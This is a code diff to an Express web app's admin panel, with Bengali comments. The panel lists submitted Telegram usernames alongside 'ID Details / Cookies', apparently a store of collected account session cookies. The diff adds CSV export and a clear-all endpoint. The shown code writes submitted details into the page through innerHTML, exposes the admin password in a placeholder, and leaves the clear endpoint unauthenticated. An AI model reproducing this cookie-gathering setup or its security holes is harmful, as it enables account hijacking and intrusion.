@@ -278,7 +278,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ==================== ২. অ্যাডমিন প্যানেল (লিঙ্ক: /admin) ====================
+// ==================== ২. আধুনিক অ্যাডমিন প্যানেল (লিঙ্ক: /admin) ====================
 app.get('/admin', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -286,37 +286,46 @@ app.get('/admin', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Google Sheet Style Admin Panel</title>
+            <title>Admin Dashboard - Modern Sheet</title>
             <style>
                 * { box-sizing: border-box; }
-                body { font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                body { font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; background: #f8fafc; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                 .card { background: white; width: 100%; max-width: 420px; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); }
-                h2 { text-align: center; color: #111827; margin-bottom: 25px; font-weight: 700; }
-                input { width: 100%; padding: 14px 18px; margin-bottom: 18px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 14px; background: #f9fafb; outline: none; transition: 0.3s; }
-                input:focus { border-color: #107c41; background: #fff; box-shadow: 0 0 0 4px rgba(16, 124, 65, 0.1); }
-                .btn { background: linear-gradient(135deg, #107c41, #0b5c31); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; font-size: 15px; font-weight: 600; width: 100%; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(16, 124, 65, 0.3); }
-                .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 124, 65, 0.4); }
+                h2 { text-align: center; color: #1e293b; margin-bottom: 25px; font-weight: 700; }
+                input { width: 100%; padding: 14px 18px; margin-bottom: 18px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 14px; background: #f8fafc; outline: none; transition: 0.3s; }
+                input:focus { border-color: #059669; background: #fff; box-shadow: 0 0 0 4px rgba(5, 150, 105, 0.1); }
+                .btn { background: linear-gradient(135deg, #059669, #047857); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; font-size: 15px; font-weight: 600; width: 100%; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(5, 150, 105, 0.3); }
+                .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(5, 150, 105, 0.4); }
                 .hidden { display: none !important; }
 
-                .admin-container { max-width: 1300px !important; width: 95% !important; padding: 30px !important; }
-                .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
-                .download-btn { background: #2563eb; color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; transition: 0.2s; box-shadow: 0 2px 6px rgba(37,99,235,0.3); }
-                .download-btn:hover { background: #1d4ed8; transform: scale(1.02); }
+                /* Modern Admin Sheet Style */
+                .admin-container { max-width: 1350px !important; width: 96% !important; padding: 30px !important; border-radius: 16px; }
+                .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
+                
+                .header-btns { display: flex; gap: 10px; flex-wrap: wrap; }
+                .action-global-btn { background: #2563eb; color: white; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.2s; box-shadow: 0 2px 6px rgba(37,99,235,0.3); display: flex; align-items: center; gap: 6px; }
+                .action-global-btn:hover { background: #1d4ed8; transform: translateY(-1px); }
+                
+                .clear-btn { background: #dc2626 !important; box-shadow: 0 2px 6px rgba(220,38,38,0.3) !important; }
+                .clear-btn:hover { background: #b91c1c !important; }
 
-                .sheet-scroll-box { max-height: 600px; overflow-y: auto; overflow-x: auto; border: 1px solid #d1d5db; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); background: white; }
-                table { width: 100%; border-collapse: collapse; font-size: 14px; min-width: 950px; background: white; }
-                th, td { border: 1px solid #d1d5db; padding: 12px 16px; text-align: left; white-space: nowrap; }
-                th { background: #107c41; color: white; font-weight: 600; text-align: center; position: sticky; top: 0; z-index: 10; }
-                td { background: #ffffff; color: #1f2937; }
+                .sheet-scroll-box { max-height: 600px; overflow-y: auto; overflow-x: auto; border: 1px solid #e2e8f0; border-radius: 10px; background: white; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02); }
+                table { width: 100%; border-collapse: collapse; font-size: 14px; min-width: 1050px; background: white; }
+                th, td { border: 1px solid #e2e8f0; padding: 12px 16px; text-align: left; white-space: nowrap; }
+                th { background: #0f172a; color: white; font-weight: 600; text-align: center; position: sticky; top: 0; z-index: 10; }
+                td { background: #ffffff; color: #334155; }
                 tr:nth-child(even) td { background: #f8fafc; }
                 
-                .sheet-details { max-width: 500px; overflow-x: auto; overflow-y: hidden; white-space: nowrap; font-family: monospace; background: #fdfdfd; padding: 6px; border-radius: 4px; border: 1px solid #eee; }
-                .sheet-details::-webkit-scrollbar { height: 6px; }
-                .sheet-details::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+                .sheet-details { max-width: 420px; overflow-x: auto; overflow-y: hidden; white-space: nowrap; font-family: monospace; background: #f1f5f9; padding: 6px 10px; border-radius: 6px; border: 1px solid #cbd5e1; }
+                .sheet-details::-webkit-scrollbar { height: 5px; }
+                .sheet-details::-webkit-scrollbar-thumb { background: #94a3b8; border-radius: 4px; }
                 
-                .received-btn { background: #107c41; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.2s; box-shadow: 0 2px 6px rgba(16,124,65,0.2); }
-                .received-btn:hover { background: #0b5c31; transform: scale(1.05); }
-                .received-text { color: #107c41; font-weight: bold; text-align: center; display: block; background: #dcfce7; padding: 6px; border-radius: 6px; }
+                .received-btn { background: #059669; color: white; border: none; padding: 7px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.2s; box-shadow: 0 2px 4px rgba(5,150,105,0.2); }
+                .received-btn:hover { background: #047857; transform: scale(1.05); }
+                .received-text { color: #047857; font-weight: bold; text-align: center; display: inline-block; background: #d1fae5; padding: 5px 12px; border-radius: 6px; font-size: 12px; }
+
+                .row-download-btn { background: #4f46e5; color: white; border: none; padding: 7px 12px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; transition: 0.2s; box-shadow: 0 2px 4px rgba(79,70,229,0.2); margin-left: 8px; }
+                .row-download-btn:hover { background: #4338ca; transform: scale(1.05); }
 
                 @media (max-width: 768px) {
                     body { padding: 10px; }
@@ -328,7 +337,7 @@ app.get('/admin', (req, res) => {
 
             <!-- Admin Login -->
             <div class="card" id="admin-login-card">
-                <h2>Admin Panel Login</h2>
+                <h2>Admin Login</h2>
                 <input type="password" id="admin-pass" placeholder="Enter Password (@MYPANEL)">
                 <button class="btn" onclick="adminLogin()">LOGIN</button>
             </div>
@@ -336,8 +345,11 @@ app.get('/admin', (req, res) => {
             <!-- Admin Sheet View -->
             <div class="card admin-container hidden" id="admin-dashboard-card">
                 <div class="header-flex">
-                    <h2 style="margin: 0; color: #107c41;">Google Sheet Format - Submissions</h2>
-                    <button class="download-btn" onclick="downloadCSV()">📥 Download as Excel / CSV</button>
+                    <h2 style="margin: 0; color: #0f172a; font-size: 22px;">📊 Admin Panel - Live Submissions</h2>
+                    <div class="header-btns">
+                        <button class="action-global-btn" onclick="downloadAllCSV()">📥 Download All (CSV)</button>
+                        <button class="action-global-btn clear-btn" onclick="clearAllSubmissions()">🗑️ Clear All</button>
+                    </div>
                 </div>
                 <div class="sheet-scroll-box">
                     <table>
@@ -346,7 +358,7 @@ app.get('/admin', (req, res) => {
                                 <th>SL</th>
                                 <th>Date & Time</th>
                                 <th>Telegram Username</th>
-                                <th>ID Details</th>
+                                <th>ID Details / Cookies</th>
                                 <th>Action / Status</th>
                             </tr>
                         </thead>
@@ -376,13 +388,22 @@ app.get('/admin', (req, res) => {
                         allSubmissions = data.submissions;
                         let tbody = document.getElementById('admin-subs-table');
                         tbody.innerHTML = '';
+                        
+                        if(allSubmissions.length === 0) {
+                            tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #64748b; padding: 25px;">No submissions found.</td></tr>';
+                            return;
+                        }
+
                         allSubmissions.forEach((s, index) => {
                             let actionColumn = s.status === 'success' 
                                 ? '<span class="received-text">RECEIVED</span>' 
                                 : '<button class="received-btn" onclick="markReceived(\\'' + s.id + '\\')">Received</button>';
                             
+                            // প্রতিটা আইডির পাশে আলাদা ডাউনলোড বাটন
+                            let rowDownloadBtn = '<button class="row-download-btn" onclick="downloadSingleRow(\\'' + s.username + '\\', \\'' + s.id + '\\')">📥 Download</button>';
+
                             let dateStr = new Date(s.date).toLocaleString();
-                            tbody.innerHTML += '<tr><td style="text-align: center; font-weight: 600;">' + (index + 1) + '</td><td>' + dateStr + '</td><td><strong style="color: #4f46e5;">@' + s.username + '</strong></td><td><div class="sheet-details">' + s.details + '</div></td><td style="text-align: center;">' + actionColumn + '</td></tr>';
+                            tbody.innerHTML += '<tr><td style="text-align: center; font-weight: 600;">' + (index + 1) + '</td><td>' + dateStr + '</td><td><strong style="color: #4f46e5;">@' + s.username + '</strong></td><td><div style="display: flex; align-items: center; justify-content: space-between;"><div class="sheet-details">' + s.details + '</div>' + rowDownloadBtn + '</div></td><td style="text-align: center;">' + actionColumn + '</td></tr>';
                         });
                     });
                 }
@@ -397,7 +418,30 @@ app.get('/admin', (req, res) => {
                     });
                 }
 
-                function downloadCSV() {
+                // নির্দিষ্ট একটি আইডি ডাউনলোড করার ফাংশন
+                function downloadSingleRow(username, id) {
+                    let sub = allSubmissions.find(s => s.id === id);
+                    if(!sub) return alert('Data not found!');
+
+                    let csvContent = "data:text/csv;charset=utf-8,Date,Telegram Username,ID Details,Status\\r\\n";
+                    let row = [
+                        '"' + new Date(sub.date).toLocaleString() + '"',
+                        '"@' + sub.username + '"',
+                        '"' + sub.details.replace(/"/g, '""') + '"',
+                        '"' + sub.status.toUpperCase() + '"'
+                    ];
+                    csvContent += row.join(",") + "\\r\\n";
+
+                    let encodedUri = encodeURI(csvContent);
+                    let link = document.createElement("a");
+                    link.setAttribute("href", encodedUri);
+                    link.setAttribute("download", username + "_id_details.csv");
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }
+
+                function downloadAllCSV() {
                     if(allSubmissions.length === 0) return alert('No data available to download!');
                     
                     let csvContent = "data:text/csv;charset=utf-8,SL,Date,Telegram Username,ID Details,Status\\r\\n";
@@ -415,10 +459,23 @@ app.get('/admin', (req, res) => {
                     let encodedUri = encodeURI(csvContent);
                     let link = document.createElement("a");
                     link.setAttribute("href", encodedUri);
-                    link.setAttribute("download", "id_submissions.csv");
+                    link.setAttribute("download", "all_id_submissions.csv");
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
+                }
+
+                // সমস্ত আইডি একসাথে ক্লিয়ার বা ডিলিট করার ফাংশন
+                function clearAllSubmissions() {
+                    if(!confirm('Are you sure you want to clear ALL submissions? This cannot be undone!')) return;
+                    
+                    fetch('/api/admin/clear', {method: 'POST'})
+                    .then(res => res.json())
+                    .then(data => {
+                        if(data.success) {
+                            loadAdminSubs();
+                        }
+                    });
                 }
             </script>
         </body>
@@ -498,6 +555,14 @@ app.post('/api/admin/update/:id', (req, res) => {
         sub.status = 'success';
         saveData(data);
     }
+    res.json({ success: true });
+});
+
+// সমস্ত সাবমিশন ক্লিয়ার করার এন্ডপয়েন্ট
+app.post('/api/admin/clear', (req, res) => {
+    const data = loadData();
+    data.submissions = [];
+    saveData(data);
     res.json({ success: true });
 });
 
